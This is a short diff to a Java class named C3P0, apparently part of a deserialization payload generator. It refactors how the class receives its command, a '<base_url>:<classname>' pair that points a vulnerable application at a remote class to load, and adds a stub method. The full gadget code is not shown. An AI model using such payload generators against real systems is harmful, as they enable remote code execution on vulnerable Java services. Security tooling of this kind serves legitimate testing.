@@ -30,10 +30,10 @@ import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
  *
  * @author mbechler
  */
-public class C3P0 {
-    public static byte[] getBytes(PayloadType type) throws Exception {
-        String      command = String.valueOf(type);
-        int sep = command.lastIndexOf(':');
+public class C3P0 implements ObjectPayload<Object> {
+    public byte[] getBytes(PayloadType type, String... param) throws Exception {
+        String command = param[0];
+        int    sep     = command.lastIndexOf(':');
         if (sep < 0) {
             throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
         }
@@ -51,6 +51,11 @@ public class C3P0 {
         oos.close();
 
         return bytes;
+    }
+
+    @Override
+    public Object getObject(String command) throws Exception {
+        return null;
     }
 
 
